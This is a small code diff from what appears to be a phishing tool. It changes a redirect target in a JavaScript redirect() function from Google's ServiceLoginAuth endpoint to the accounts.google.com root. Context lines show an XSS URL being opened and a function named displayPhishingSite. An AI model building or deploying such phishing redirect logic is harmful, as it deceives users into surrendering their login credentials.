@@ -34,7 +34,7 @@ function redirect(){
         window.open(theXssUrl);
         window.focus();
     }
-    window.location = "https://accounts.google.com/ServiceLoginAuth";
+    window.location = "https://accounts.google.com/";
 }
 
 function displayPhishingSite(){
